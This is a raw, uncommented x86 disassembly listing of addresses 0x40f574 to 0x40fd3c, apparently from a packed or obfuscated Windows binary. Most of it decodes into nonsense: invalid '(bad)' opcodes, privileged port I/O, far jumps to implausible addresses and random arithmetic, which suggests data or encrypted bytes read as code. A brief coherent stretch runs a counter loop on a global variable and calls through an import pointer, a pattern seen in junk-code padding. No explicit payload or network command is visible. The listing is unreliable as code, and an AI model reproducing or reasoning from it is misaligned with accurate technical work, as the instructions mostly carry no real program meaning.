  40f574:	mov    bh,BYTE PTR [ebx-0x1a8787be]
  40f57a:	jle    0x40f5f4
  40f57c:	js     0x40f579
  40f57e:	adc    edi,ecx
  40f580:	lds    esi,FWORD PTR [edi]
  40f582:	ja     0x40f59a
  40f584:	ret    
  40f585:	mov    bh,0x22
  40f587:	or     eax,0x6a132c90
  40f58c:	loop   0x40f590
  40f58e:	ins    BYTE PTR es:[edi],dx
  40f58f:	jg     0x40f560
  40f591:	jle    0x40f530
  40f593:	add    BYTE PTR [ebx+edx*1-0x19f4319a],ch
  40f59a:	out    0x25,al
  40f59c:	icebp  
  40f59d:	(bad)  
  40f59e:	outs   dx,DWORD PTR ds:[esi]
  40f59f:	std    
  40f5a0:	and    DWORD PTR [ebp+ecx*2+0x71b9601f],0x6e
  40f5a8:	sahf   
  40f5a9:	addr16 mov al,ds:0x30f7
  40f5ad:	add    bh,BYTE PTR [eax-0x23901fdc]
  40f5b3:	xor    al,0x2c
  40f5b5:	dec    ecx
  40f5b6:	sahf   
  40f5b7:	in     al,dx
  40f5b8:	mov    ebp,DWORD PTR [ecx+esi*2+0x402a1c30]
  40f5bf:	dec    al
  40f5c1:	inc    eax
  40f5c2:	mov    edx,0xc1f1d049
  40f5c7:	aas    
  40f5c8:	out    0x99,eax
  40f5ca:	add    BYTE PTR [edx],0xb3
  40f5cd:	test   DWORD PTR [ebp+0x4ebe743b],esp
  40f5d3:	sbb    ebp,DWORD PTR [ebx+eiz*2-0x19a14ec9]
  40f5da:	ret    0xbf36
  40f5dd:	xor    ebx,DWORD PTR [eax+0x353c1fc1]
  40f5e3:	adc    eax,0x409b7625
  40f5e8:	jno    0x40f586
  40f5ea:	fistp  WORD PTR [eax+0x4e]
  40f5ed:	scas   eax,DWORD PTR es:[edi]
  40f5ee:	test   DWORD PTR [ecx+0x8],esi
  40f5f1:	and    bh,al
  40f5f3:	jo     0x40f662
  40f5f5:	xor    edi,ecx
  40f5f7:	add    al,0x50
  40f5f9:	mov    edi,edx
  40f5fb:	ja     0x40f65f
  40f5fd:	test   al,0x5
  40f5ff:	in     al,dx
  40f600:	dec    esi
  40f601:	int    0x16
  40f603:	push   ss
  40f604:	xor    bh,ah
  40f606:	popa   
  40f607:	mov    al,ds:0x95d9835
  40f60c:	push   ss
  40f60d:	jo     0x40f635
  40f60f:	sbb    eax,0x605d4132
  40f614:	dec    esi
  40f615:	fsub   DWORD PTR [edx]
  40f617:	xchg   esp,eax
  40f618:	xchg   BYTE PTR [ecx-0x5a1929cc],ah
  40f61e:	sbb    DWORD PTR [esi-0x3119660e],eax
  40f624:	jae    0x40f64f
  40f626:	(bad)
  40f62b:	retf   
  40f62c:	inc    ecx
  40f62d:	or     al,0x54
  40f62f:	mov    eax,0xfe7a029e
  40f634:	xor    edi,DWORD PTR [edx-0x7b728bef]
  40f63a:	mov    BYTE PTR [ebx+ecx*2+0x12d42ad1],ch
  40f641:	dec    esi
  40f642:	stos   DWORD PTR es:[edi],eax
  40f643:	mov    edi,0xf0e5b4d4
  40f648:	cmp    BYTE PTR [ecx+eiz*1],ah
  40f64b:	inc    esi
  40f64c:	aad    0x1a
  40f64e:	sti    
  40f64f:	add    bl,ch
  40f651:	push   es
  40f652:	cmp    BYTE PTR [ecx],bl
  40f654:	ins    BYTE PTR es:[edi],dx
  40f655:	stos   BYTE PTR es:[edi],al
  40f656:	fsubr  DWORD PTR [esp+edx*4-0x2]
  40f65a:	mov    ds:0x1b08d6d8,al
  40f65f:	ds sbb ecx,eax
  40f662:	mov    ecx,0x8806f42
  40f667:	into   
  40f668:	rcr    BYTE PTR [esi+0x38],cl
  40f66b:	fdivr  QWORD PTR [ecx+0x693a3a2]
  40f671:	cli    
  40f672:	mov    dh,BYTE PTR [edi+0x1f5484bf]
  40f678:	call   DWORD PTR [edx]
  40f67a:	rcl    DWORD PTR [eax+eiz*8+0x2],cl
  40f67e:	xchg   ecx,eax
  40f67f:	adc    al,0x10
  40f681:	or     al,0x81
  40f683:	xor    al,ch
  40f685:	icebp  
  40f686:	aad    0x51
  40f688:	in     eax,0xca
  40f68a:	(bad)  
  40f68b:	push   ss
  40f68c:	add    ah,BYTE PTR [ebx]
  40f68e:	adc    al,0x92
  40f690:	ins    BYTE PTR es:[edi],dx
  40f691:	jg     0x40f69d
  40f693:	or     BYTE PTR [eax+edi*2],ch
  40f696:	(bad)  
  40f697:	out    dx,eax
  40f698:	ins    BYTE PTR es:[edi],dx
  40f699:	out    0x82,eax
  40f69b:	sbb    dh,ch
  40f69d:	dec    ecx
  40f69e:	aaa    
  40f69f:	pop    eax
  40f6a0:	jl     0x40f6fe
  40f6a2:	dec    esp
  40f6a3:	push   ss
  40f6a4:	gs inc esp
  40f6a6:	xchg   ebp,eax
  40f6a7:	xchg   BYTE PTR ds:0xd08ff430,al
  40f6ad:	sahf   
  40f6ae:	mov    al,0xd4
  40f6b0:	test   eax,0x931f6e8a
  40f6b5:	in     eax,dx
  40f6b6:	aaa    
  40f6b7:	and    ch,BYTE PTR [esi-0x32012458]
  40f6bd:	mov    eax,0x83d9ab90
  40f6c2:	pop    esi
  40f6c3:	in     al,dx
  40f6c4:	or     BYTE PTR [esi-0x11eeb93],0xa3
  40f6cb:	jno    0x40f6b2
  40f6cd:	retf   0x5363
  40f6d0:	mov    ah,0xe1
  40f6d2:	bound  edx,QWORD PTR [eax]
  40f6d4:	es retf 0x546e
  40f6d8:	cld    
  40f6d9:	sub    DWORD PTR [eax+0x2bb9e54d],esi
  40f6df:	enter  0xf8e4,0xbf
  40f6e3:	xchg   ebx,eax
  40f6e4:	and    DWORD PTR [ebp+0x59],edi
  40f6e7:	ds (bad) 
  40f6ea:	fst    QWORD PTR [ebp+eiz*4+0x19f49dd]
  40f6f1:	jg     0x40f756
  40f6f3:	pop    esp
  40f6f4:	xchg   ecx,eax
  40f6f5:	jecxz  0x40f6de
  40f6f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f6f8:	std    
  40f6f9:	bnd cs ja 0x40f6d4
  40f6fd:	in     eax,dx
  40f6fe:	pop    esi
  40f6ff:	dec    ebp
  40f700:	pushf  
  40f701:	nop
  40f702:	ja     0x40f73b
  40f704:	retf   0x7050
  40f707:	or     BYTE PTR [edx+0x691f1683],0x12
  40f70e:	out    dx,al
  40f70f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f710:	in     eax,0x2a
  40f712:	xor    BYTE PTR [esi],0x83
  40f715:	out    0x37,eax
  40f717:	pop    edi
  40f718:	sub    DWORD PTR [eax+0x7e83dd21],0x4c
  40f71f:	imul   edi,DWORD PTR [ecx],0x143463e3
  40f725:	jmp    0xdc3b5b91
  40f72a:	or     ch,BYTE PTR [ebx+0x4a6787af]
  40f730:	aam    0xef
  40f732:	(bad)
  40f735:	rcl    DWORD PTR [ebp-0x644408cf],1
  40f73b:	imul   ebx,edi,0xf0583ccc
  40f741:	mov    ebx,0x52693765
  40f746:	out    dx,al
  40f747:	push   es
  40f748:	mov    ch,BYTE PTR [edi-0x25fbd14]
  40f74e:	push   cs
  40f74f:	pop    ds
  40f750:	xlat   BYTE PTR ds:[ebx]
  40f751:	test   BYTE PTR [edx-0x1d],ch
  40f754:	cmp    cl,ah
  40f756:	xchg   ebx,eax
  40f757:	leave  
  40f758:	scas   eax,DWORD PTR es:[edi]
  40f759:	hlt    
  40f75a:	bnd jmp 0x75f3073a
  40f760:	mov    edi,edi
  40f762:	or     al,BYTE PTR [ebp-0x69c093b4]
  40f768:	push   eax
  40f769:	jno    0x40f7b7
  40f76b:	or     DWORD PTR [edi-0x3d38937b],0xc
  40f772:	rol    DWORD PTR [esi],cl
  40f774:	mov    bh,0x86
  40f776:	sbb    esi,ecx
  40f778:	lea    esi,[eax+edi*4-0x7c290b97]
  40f77f:	xor    al,0x34
  40f781:	dec    ebp
  40f782:	jp     0x40f7ca
  40f784:	jecxz  0x40f7f8
  40f786:	out    0x4e,eax
  40f788:	pop    ss
  40f789:	sbb    eax,0x9a2005a
  40f78e:	enter  0xdcb4,0x78
  40f792:	jo     0x40f802
  40f794:	push   0x71b14fdc
  40f799:	ja     0x40f7cc
  40f79b:	clc    
  40f79c:	cwde   
  40f79d:	cli    
  40f79e:	in     eax,0x57
  40f7a0:	push   eax
  40f7a1:	shl    BYTE PTR [ecx+0x119f175e],1
  40f7a7:	mov    ch,0xe0
  40f7a9:	fild   QWORD PTR [esi-0x42]
  40f7ac:	mov    DWORD PTR ds:0x442bc7a9,ebp
  40f7b2:	imul   ecx,DWORD PTR [ebp+eax*8+0x16a51103],0x685a12af
  40f7bd:	and    BYTE PTR [esi-0x34c28a00],0x9d
  40f7c4:	add    eax,0x6569cfef
  40f7c9:	xor    al,0x68
  40f7cb:	mov    edx,0x4fbfac42
  40f7d0:	inc    eax
  40f7d1:	(bad)  
  40f7d2:	ss mov eax,0x2a8a5d84
  40f7d8:	push   edi
  40f7d9:	mov    ds:0xee2d6b55,eax
  40f7de:	rcr    BYTE PTR [esp+eax*8],0x2e
  40f7e2:	call   DWORD PTR ds:0x9a4f0c4a
  40f7e8:	add    edx,ecx
  40f7ea:	cmp    edi,edx
  40f7ec:	mov    DWORD PTR ds:0x42a779,0x7d48
  40f7f6:	jmp    0x40fa7e
  40f7fb:	ret    0xc9cd
  40f7fe:	ret    
  40f7ff:	(bad)  
  40f801:	retf   0x10cd
  40f804:	test   BYTE PTR ds:0x15410f5f,ch
  40f80a:	sahf   
  40f80b:	and    BYTE PTR [edi+0x78],al
  40f80e:	js     0x40f7f5
  40f810:	jle    0x40f88a
  40f812:	js     0x40f83c
  40f814:	push   0xa4d67c58
  40f819:	pop    esp
  40f81a:	in     al,0xbe
  40f81c:	data16 frstpm(287 only) 
  40f81f:	repnz (bad)
  40f822:	gs test al,0x97
  40f825:	cmp    DWORD PTR [eax],eax
  40f827:	cmp    DWORD PTR [edx],esi
  40f829:	sub    BYTE PTR [eax],dh
  40f82b:	sbb    DWORD PTR [edi+0x55],0x3b
  40f82f:	mov    edx,0xbf4a784
  40f834:	mov    ch,0xbb
  40f836:	cmp    esp,esp
  40f838:	mov    ch,0x25
  40f83a:	sub    DWORD PTR [ebp+esi*8+0x706a68dd],eax
  40f841:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f842:	mov    bh,0xed
  40f844:	aad    0xb7
  40f846:	jecxz  0x40f7f9
  40f848:	or     BYTE PTR [ebx-0xc],dh
  40f84b:	sub    dl,ch
  40f84d:	call   0x53b2:0xd9461242
  40f854:	jp     0x40f816
  40f856:	aam    0x63
  40f858:	cmp    DWORD PTR [ecx],0x57
  40f85b:	outs   dx,BYTE PTR ds:[esi]
  40f85c:	sti    
  40f85d:	loop   0x40f8de
  40f85f:	sbb    eax,0x8735cd0f
  40f864:	jge    0x40f803
  40f866:	adc    bl,BYTE PTR [esi+0x33]
  40f869:	add    DWORD PTR [ebp+0x7e],ecx
  40f86c:	test   bh,cl
  40f86e:	mov    al,0xe2
  40f870:	adc    ah,BYTE PTR [eax+0x7332d26c]
  40f876:	inc    eax
  40f877:	or     BYTE PTR [esi+0x60],bh
  40f87a:	(bad)  
  40f87b:	cli    
  40f87c:	leave  
  40f87d:	mov    esp,0x603184ff
  40f882:	sub    eax,0xff84ba50
  40f887:	fisub  DWORD PTR [edi+0x2f50519a]
  40f88d:	jle    0x40f8aa
  40f88f:	push   0xe966f8eb
  40f894:	aaa    
  40f895:	adc    eax,0xad110bee
  40f89a:	fs jo  0x40f8e1
  40f89d:	jl     0x40f84e
  40f89f:	(bad)  
  40f8a0:	fs inc ecx
  40f8a2:	aam    0x1a
  40f8a4:	fdivr  QWORD PTR [ecx+ebx*8-0x2c]
  40f8a8:	cmc    
  40f8a9:	sub    eax,0xce47936d
  40f8ae:	and    eax,0xb01667d
  40f8b3:	jg     0x40f858
  40f8b5:	adc    eax,0x971978fb
  40f8ba:	shr    DWORD PTR [eax-0x44824f0c],0xd
  40f8c1:	mov    al,ch
  40f8c3:	dec    ebx
  40f8c4:	mov    edi,0xc83a250f
  40f8c9:	jmp    0x7bde:0x654331f0
  40f8d0:	div    DWORD PTR [edi]
  40f8d2:	pop    ds
  40f8d3:	pusha  
  40f8d4:	aaa    
  40f8d5:	xchg   edi,eax
  40f8d6:	cmp    eax,0xe7f95f09
  40f8db:	inc    edi
  40f8dc:	test   DWORD PTR ds:0xcff8c7d0,ebx
  40f8e2:	enter  0x2455,0x40
  40f8e6:	scas   eax,DWORD PTR es:[edi]
  40f8e7:	cwde   
  40f8e8:	dec    ecx
  40f8e9:	sbb    dh,bh
  40f8eb:	repz les edi,FWORD PTR [eax-0x44]
  40f8ef:	rcl    DWORD PTR [esi-0x5f24e30a],1
  40f8f5:	mul    DWORD PTR [esi+0x2e]
  40f8f8:	imul   eax,DWORD PTR [ebx],0xd02959c1
  40f8fe:	out    dx,eax
  40f8ff:	jge    0x40f8ef
  40f901:	jge    0x40f8c4
  40f903:	test   DWORD PTR [edx-0x5c],esp
  40f906:	pop    ebx
  40f907:	pop    esp
  40f908:	inc    ecx
  40f909:	pop    eax
  40f90a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f90b:	aaa    
  40f90c:	data16 adc ch,BYTE PTR [ebp-0x71]
  40f910:	mov    BYTE PTR [esi+edi*8-0x22],ch
  40f914:	stos   BYTE PTR es:[edi],al
  40f915:	and    DWORD PTR [ebp+0x4f],esp
  40f918:	add    DWORD PTR [edx+edi*4],esi
  40f91b:	fcom   DWORD PTR [ebp-0x1ae9885f]
  40f921:	dec    edx
  40f922:	std    
  40f923:	jg     0x40f8e3
  40f925:	xchg   ecx,eax
  40f926:	sub    BYTE PTR [eax+0x1a9edeab],ch
  40f92c:	inc    esi
  40f92d:	outs   dx,DWORD PTR ds:[esi]
  40f92e:	test   al,0x5e
  40f930:	ds popf 
  40f932:	scas   eax,DWORD PTR es:[edi]
  40f933:	ror    cl,1
  40f935:	dec    esp
  40f936:	mov    ch,0x8b
  40f938:	inc    edx
  40f939:	inc    esp
  40f93a:	retf   
  40f93b:	mov    eax,ds:0x842b9468
  40f940:	repnz mov dl,0x6e
  40f943:	mov    ebp,0xc5d5f3af
  40f948:	gs call 0xfe4a1b85
  40f94e:	retf   0x7de7
  40f951:	xor    DWORD PTR [ebx+ebx*4+0x1279c143],ecx
  40f958:	inc    eax
  40f959:	sbb    ah,BYTE PTR [edx+0x37]
  40f95c:	loopne 0x40f8e2
  40f95e:	dec    ebx
  40f95f:	ins    BYTE PTR es:[edi],dx
  40f960:	cmp    al,0xf7
  40f962:	mov    esi,0x4693656b
  40f967:	inc    edx
  40f968:	out    dx,eax
  40f969:	push   ss
  40f96a:	inc    ebp
  40f96b:	sbb    bl,BYTE PTR [edi+0x39b32adb]
  40f971:	pop    esp
  40f972:	sbb    dl,BYTE PTR [edx+0x21634392]
  40f978:	mov    esi,0xa710611f
  40f97d:	aad    0x6d
  40f97f:	xchg   esi,eax
  40f980:	push   edi
  40f981:	(bad)
  40f984:	test   eax,0xd6a9a2e0
  40f989:	outs   dx,BYTE PTR ds:[esi]
  40f98a:	fs mov dh,0x16
  40f98d:	sbb    al,0xe5
  40f98f:	inc    ebx
  40f990:	dec    ebp
  40f991:	in     al,0x2
  40f993:	xchg   edi,eax
  40f994:	push   0xffffffa5
  40f996:	xchg   BYTE PTR [edi-0x6b],ch
  40f999:	clc    
  40f99a:	les    ecx,FWORD PTR [eax-0x70]
  40f99d:	pushf  
  40f99e:	sub    eax,0xf9a97b4b
  40f9a3:	add    DWORD PTR [eax-0x30fa417c],eax
  40f9a9:	xor    BYTE PTR [edx+0x4a1e83b9],ah
  40f9af:	xchg   ebp,eax
  40f9b0:	dec    edi
  40f9b1:	adc    DWORD PTR [ecx+esi*4],ebp
  40f9b4:	cld    
  40f9b5:	and    edi,DWORD PTR [ebx-0x2]
  40f9b8:	xchg   edi,eax
  40f9b9:	mov    eax,0xdabd3eed
  40f9be:	cwde   
  40f9bf:	in     eax,dx
  40f9c0:	push   es
  40f9c1:	loope  0x40f9ae
  40f9c3:	fnsave [eax+0x22]
  40f9c6:	and    ah,0x9e
  40f9c9:	or     BYTE PTR [ebp-0x76],0x92
  40f9cd:	arpl   WORD PTR [ecx+0x67aa6755],si
  40f9d3:	ror    BYTE PTR [ebp-0x57],0x6c
  40f9d7:	and    BYTE PTR [esi-0x3a],ah
  40f9da:	aas    
  40f9db:	je     0x40f9c8
  40f9dd:	jb     0x40f9b8
  40f9df:	pop    es
  40f9e0:	loope  0x40f973
  40f9e2:	(bad)  
  40f9e3:	jg     0x40fa11
  40f9e5:	imul   ebp,DWORD PTR [esp+ebp*4+0x25],0x8c1d5c5e
  40f9ed:	rep outs dx,DWORD PTR ds:[esi]
  40f9ef:	push   esi
  40f9f0:	fldcw  WORD PTR [ecx+0xda7c7b7]
  40f9f6:	fadd   QWORD PTR [edx-0x80]
  40f9f9:	sbb    edx,edi
  40f9fb:	push   0x6411610f
  40fa00:	mov    edi,0x3e0f0a08
  40fa05:	aas    
  40fa06:	ret    
  40fa07:	jle    0x40fa39
  40fa09:	scas   eax,DWORD PTR es:[edi]
  40fa0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa0b:	mov    eax,ds:0x24b2f5e7
  40fa10:	jle    0x40fa90
  40fa12:	mov    dl,0x82
  40fa14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa15:	sub    ah,ah
  40fa17:	pop    edi
  40fa18:	lods   al,BYTE PTR ds:[esi]
  40fa19:	leave  
  40fa1a:	jp     0x40fa04
  40fa1c:	imul   ebx,DWORD PTR [ecx+edi*2],0xa29e6596
  40fa23:	mov    edx,cs
  40fa25:	in     al,0xe3
  40fa27:	and    al,0xd7
  40fa29:	adc    dh,BYTE PTR [ebx-0x74]
  40fa2c:	or     al,0xda
  40fa2e:	das    
  40fa2f:	addr16 int3 
  40fa31:	and    DWORD PTR [ecx-0x67],eax
  40fa34:	add    DWORD PTR [ebp-0x65],0x7a89a92a
  40fa3b:	add    ah,BYTE PTR [edi]
  40fa3d:	stc    
  40fa3e:	bnd ret 
  40fa40:	inc    eax
  40fa41:	pop    ecx
  40fa42:	je     0x40fa59
  40fa44:	push   ebx
  40fa45:	adc    eax,0x760baf24
  40fa4a:	leave  
  40fa4b:	sub    BYTE PTR [edi-0x230322ce],0x1
  40fa52:	push   edi
  40fa53:	mov    cl,0xda
  40fa55:	cli    
  40fa56:	ja     0x40fa6c
  40fa58:	adc    ecx,DWORD PTR [edx+ecx*4+0x71]
  40fa5c:	popa   
  40fa5d:	fs (bad) 
  40fa5f:	jmp    0xd01f46d5
  40fa64:	gs xchg ebp,eax
  40fa66:	xchg   DWORD PTR [ecx],ebp
  40fa68:	sbb    eax,edx
  40fa6a:	jno    0x40fa37
  40fa6c:	std    
  40fa6d:	ins    BYTE PTR es:[edi],dx
  40fa6e:	data16 icebp 
  40fa70:	dec    esp
  40fa71:	pop    ds
  40fa72:	or     ebx,eax
  40fa74:	sbb    ah,al
  40fa76:	push   ss
  40fa77:	test   eax,0x760e2b82
  40fa7c:	jb     0x40fae7
  40fa7e:	je     0x414e2f
  40fa84:	push   ebx
  40fa85:	mov    DWORD PTR ds:0x42a809,0x5779
  40fa8f:	jmp    0x4148fa
  40fa94:	mov    DWORD PTR ds:0x42a7c1,0x1b
  40fa9e:	cmp    DWORD PTR ds:0x42a7c1,0x0
  40faa5:	je     0x40faf7
  40faab:	cmp    DWORD PTR ds:0x42a7c1,0x7
  40fab2:	jne    0x40facb
  40fab8:	push   0x6ecd
  40fabd:	push   0x4c4c
  40fac2:	push   DWORD PTR [ebp-0x1c]
  40fac5:	call   DWORD PTR ds:0x41d1a8
  40facb:	cmp    DWORD PTR ds:0x42a7c1,0x8
  40fad2:	jne    0x40fae5
  40fad8:	mov    edi,DWORD PTR ds:0x42a7c1
  40fade:	dec    edi
  40fadf:	mov    DWORD PTR ds:0x42a7c1,edi
  40fae5:	mov    edi,DWORD PTR ds:0x42a7c1
  40faeb:	dec    edi
  40faec:	mov    DWORD PTR ds:0x42a7c1,edi
  40faf2:	jmp    0x40fa9e
  40faf7:	mov    edx,DWORD PTR [ebp-0x8]
  40fafa:	mov    edi,DWORD PTR [ebp-0x10]
  40fafd:	jmp    0x40fd85
  40fb02:	cmp    eax,0xd9c7c9d6
  40fb07:	fcmovnb st,st(1)
  40fb09:	(bad)  
  40fb0a:	cmc    
  40fb0b:	into   
  40fb0c:	inc    edx
  40fb0d:	jge    0x40fb0a
  40fb0f:	outs   dx,BYTE PTR ds:[esi]
  40fb10:	mov    gs:0x7878458d,eax
  40fb16:	in     eax,0x7e
  40fb18:	js     0x40fb92
  40fb1a:	cmc    
  40fb1b:	inc    ecx
  40fb1c:	jae    0x40fb8a
  40fb1e:	mov    cl,0xf2
  40fb20:	push   ss
  40fb21:	repz mov ch,BYTE PTR gs:[ecx+0x23bcb6c1]
  40fb29:	push   ebx
  40fb2a:	push   eax
  40fb2b:	imul   eax,DWORD PTR [edi+0x1e],0xa380eb3b
  40fb32:	mov    cl,0xfa
  40fb34:	nop
  40fb35:	sti    
  40fb36:	mov    edi,0xb6a84ea2
  40fb3b:	icebp  
  40fb3c:	mov    bl,0xd0
  40fb3e:	imul   ebx,DWORD PTR [edi+0x5a],0xf5eda703
  40fb45:	ror    DWORD PTR [ebx+edx*2-0x21929a92],0xfb
  40fb4d:	test   DWORD PTR [edx+0x4987bbeb],ebx
  40fb53:	daa    
  40fb54:	jo     0x40fb67
  40fb56:	daa    
  40fb57:	dec    esp
  40fb58:	sub    dl,ah
  40fb5a:	call   0xde9d46d1
  40fb5f:	(bad)  
  40fb60:	sti    
  40fb61:	mov    edx,0x1ec98dd1
  40fb66:	lods   al,BYTE PTR ds:[esi]
  40fb67:	xchg   esp,eax
  40fb68:	cld    
  40fb69:	sbb    dh,BYTE PTR [edx-0x32]
  40fb6c:	mov    al,ds:0x3c2b68ed
  40fb71:	mov    eax,0x7866d789
  40fb76:	test   al,0xec
  40fb78:	dec    esp
  40fb79:	ds loope 0x40fb9f
  40fb7c:	add    DWORD PTR [esi+0x79],esi
  40fb7f:	enter  0xf95e,0x40
  40fb83:	retf   
  40fb84:	jns    0x40fb50
  40fb86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb87:	inc    ebx
  40fb88:	js     0x40fb2b
  40fb8a:	fwait
  40fb8b:	and    al,0xe
  40fb8d:	push   ds
  40fb8e:	repnz sbb edi,DWORD PTR [edx-0x27]
  40fb92:	xor    ebx,ebx
  40fb94:	pop    eax
  40fb95:	ins    DWORD PTR es:[edi],dx
  40fb96:	data16 adc cl,BYTE PTR [esi+0x57]
  40fb9a:	jns    0x40fb60
  40fb9c:	scas   eax,DWORD PTR es:[edi]
  40fb9d:	cmp    esi,DWORD PTR [edi-0x39]
  40fba0:	push   es
  40fba1:	not    DWORD PTR [eax+eiz*1+0x5a37da6d]
  40fba8:	mov    ecx,0x9640f70
  40fbad:	loop   0x40fb73
  40fbaf:	and    ecx,DWORD PTR [edi-0x4330e7cf]
  40fbb5:	push   ebx
  40fbb6:	jns    0x40fb53
  40fbb8:	or     ah,al
  40fbba:	dec    ebp
  40fbbb:	xor    bl,ch
  40fbbd:	sub    eax,0xc7ffa4ec
  40fbc2:	and    al,0xe9
  40fbc4:	mov    fs:0xae8d5e0b,al
  40fbca:	push   ecx
  40fbcb:	inc    esi
  40fbcc:	mov    dl,0x7
  40fbce:	push   ds
  40fbcf:	or     BYTE PTR ds:0x204caa00,0x60
  40fbd6:	int    0x80
  40fbd8:	xchg   edi,eax
  40fbd9:	cli    
  40fbda:	ins    BYTE PTR es:[edi],dx
  40fbdb:	mov    edx,0xa1c421a0
  40fbe0:	xchg   edx,eax
  40fbe1:	add    BYTE PTR ds:0x411847e2,cl
  40fbe7:	and    BYTE PTR [ebp+0x4bf3c82d],dh
  40fbed:	popa   
  40fbee:	pushf  
  40fbef:	shl    BYTE PTR [ecx],1
  40fbf1:	retf   0x3159
  40fbf4:	call   0x5d579fc6
  40fbf9:	inc    edi
  40fbfa:	in     eax,0xa6
  40fbfc:	dec    esi
  40fbfd:	in     eax,0xb6
  40fbff:	imul   edx,DWORD PTR [esp+eiz*8-0x33],0x30
  40fc04:	scas   al,BYTE PTR es:[edi]
  40fc05:	dec    DWORD PTR [ecx-0x43d64ab8]
  40fc0b:	in     al,dx
  40fc0c:	in     al,0x50
  40fc0e:	push   cs
  40fc0f:	pop    esi
  40fc10:	sub    BYTE PTR [edx],0x4b
  40fc13:	mov    ebx,0x903e389b
  40fc18:	ss in  al,dx
  40fc1a:	aas    
  40fc1b:	push   ecx
  40fc1c:	pop    ecx
  40fc1d:	mov    edx,0xe99e9757
  40fc22:	call   DWORD PTR ss:[edi+0x2a]
  40fc26:	cld    
  40fc27:	je     0x40fbe3
  40fc29:	dec    BYTE PTR ds:0xc6273d72
  40fc2f:	and    BYTE PTR [ebx+0x0],dl
  40fc32:	lods   al,BYTE PTR ds:[esi]
  40fc33:	mov    bh,0xaa
  40fc35:	hlt    
  40fc36:	push   edx
  40fc37:	or     ebx,DWORD PTR [eax-0x21]
  40fc3a:	push   ecx
  40fc3b:	sbb    DWORD PTR [edi],0x7058196
  40fc41:	je     0x40fbc7
  40fc43:	sbb    eax,0x8211dad2
  40fc48:	xor    al,0xe
  40fc4a:	out    0xaa,al
  40fc4c:	jg     0x40fc7f
  40fc4e:	xor    ecx,eax
  40fc50:	cmc    
  40fc51:	popa   
  40fc52:	sub    BYTE PTR [edx-0x4d],bl
  40fc55:	stos   BYTE PTR es:[edi],al
  40fc56:	inc    edi
  40fc57:	inc    ebp
  40fc58:	scas   eax,DWORD PTR es:[edi]
  40fc59:	mov    edx,0x2093de4
  40fc5e:	(bad)  
  40fc5f:	in     al,0x81
  40fc61:	aad    0xaa
  40fc63:	add    eax,0xa8056f75
  40fc68:	das    
  40fc69:	neg    dl
  40fc6b:	push   ebp
  40fc6c:	add    dl,BYTE PTR [edi-0x12]
  40fc6f:	push   esp
  40fc70:	std    
  40fc71:	fld    TBYTE PTR [ebx+0x57]
  40fc74:	xchg   esp,eax
  40fc75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc76:	push   cs
  40fc77:	mov    ch,0x10
  40fc79:	jg     0x40fcea
  40fc7b:	push   0x7eae8207
  40fc80:	ja     0x40fc27
  40fc82:	ficomp WORD PTR [edx]
  40fc84:	in     eax,0xec
  40fc86:	mov    ecx,0xb415fb72
  40fc8b:	jnp    0x40fc75
  40fc8d:	test   BYTE PTR [ebx],bl
  40fc8f:	fldl2e 
  40fc91:	dec    ebx
  40fc92:	push   edx
  40fc93:	imul   ch
  40fc95:	sub    BYTE PTR ds:0xb1e7965f,0x87
  40fc9c:	loopne 0x40fc9e
  40fc9e:	imul   esi,DWORD PTR [edx],0xdc7917e9
  40fca4:	pop    ebx
  40fca5:	test   edi,ecx
  40fca7:	fimul  DWORD PTR [edx+0x2ca32e36]
  40fcad:	int    0x6b
  40fcaf:	pop    ds
  40fcb0:	xchg   esp,eax
  40fcb1:	jnp    0x40fc4b
  40fcb3:	lock inc esi
  40fcb5:	in     al,0x2a
  40fcb7:	xchg   ebx,eax
  40fcb8:	ficom  DWORD PTR [esi+0x58]
  40fcbb:	sub    DWORD PTR [esi],ebx
  40fcbd:	add    bl,ah
  40fcbf:	outs   dx,BYTE PTR ds:[esi]
  40fcc0:	push   ebx
  40fcc1:	push   cs
  40fcc2:	push   ebx
  40fcc3:	(bad)  
  40fcc4:	das    
  40fcc5:	outs   dx,BYTE PTR ds:[esi]
  40fcc6:	repnz les esi,FWORD PTR [ecx]
  40fcc9:	xor    bl,BYTE PTR [ebp+0x58]
  40fccc:	dec    esp
  40fccd:	cmp    DWORD PTR cs:[eax-0x6452a34f],ebp
  40fcd4:	out    dx,eax
  40fcd5:	and    BYTE PTR [ecx],bl
  40fcd7:	js     0x40fcbc
  40fcd9:	out    0xd1,al
  40fcdb:	inc    edx
  40fcdc:	xchg   esp,eax
  40fcdd:	add    eax,0x9e1c442b
  40fce2:	dec    esp
  40fce3:	retf   
  40fce4:	mov    ecx,edi
  40fce6:	ds popa 
  40fce8:	das    
  40fce9:	sub    ch,BYTE PTR [ecx+0x1a]
  40fcec:	lds    esi,FWORD PTR [esi+eiz*8-0x53]
  40fcf0:	cmp    BYTE PTR [ebx-0x74],bh
  40fcf3:	mov    eax,ds:0xdfa44d3e
  40fcf8:	sub    cl,BYTE PTR [ebp-0x3c]
  40fcfb:	mov    al,0x5c
  40fcfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fcfe:	and    al,0x1
  40fd00:	cmp    eax,DWORD PTR [esi-0x2fdc5cab]
  40fd06:	mov    cl,BYTE PTR [edx+ebx*8]
  40fd09:	and    al,0x9b
  40fd0b:	fsubr  DWORD PTR [esi+ecx*2]
  40fd0e:	mov    esi,0xbf10b1ef
  40fd13:	out    0x75,al
  40fd15:	sbb    esp,DWORD PTR [edi+esi*2-0x1c962d37]
  40fd1c:	jmp    0x40fd7a
  40fd1e:	pop    ebp
  40fd1f:	push   edx
  40fd20:	push   esp
  40fd21:	lods   al,BYTE PTR ds:[esi]
  40fd22:	mov    eax,esi
  40fd24:	jl     0x40fd8b
  40fd26:	ret    
  40fd27:	mov    edx,0xc16baa9
  40fd2c:	dec    ebp
  40fd2d:	xlat   BYTE PTR ds:[ebx]
  40fd2e:	pop    edi
  40fd2f:	bnd js 0x40fd17
  40fd32:	adc    edi,DWORD PTR [edx+0x4]
  40fd35:	mov    al,ds:0x83b42567
  40fd3a:	push   ebp
  40fd3b:	pop    ss
  40fd3c:	push   eax
